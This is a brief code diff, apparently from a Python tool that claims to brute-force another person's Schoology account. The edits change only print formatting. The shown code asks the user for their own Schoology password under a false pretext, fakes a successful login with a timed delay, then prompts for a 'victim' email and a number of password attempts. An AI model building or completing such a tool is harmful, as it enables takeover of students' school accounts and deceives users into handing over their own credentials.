@@ -19,9 +19,10 @@ print('''
 ''')
 e = input("[?] Your schoology email?: ")
 d = input("[?] Your schoology password? (bruteforce attack wont work without it): ")
-print("attempting to login with...\033[1;3m " + e + " " + d\033[0m)
+print("attempting to login with...\033[1;3m " + e + ", " + d)
 time.sleep(3)
-print("successfully logged in as " + e + \u2713)                                                               
+print("successfully logged in as " + e + "[\u2713]")
+
 c = input("[?] Victims schoology email?: ")
 b = int(input("[?] How many passwords would you like to try?: "))
 a = input("[?] Start Attack? [y/n]: ")
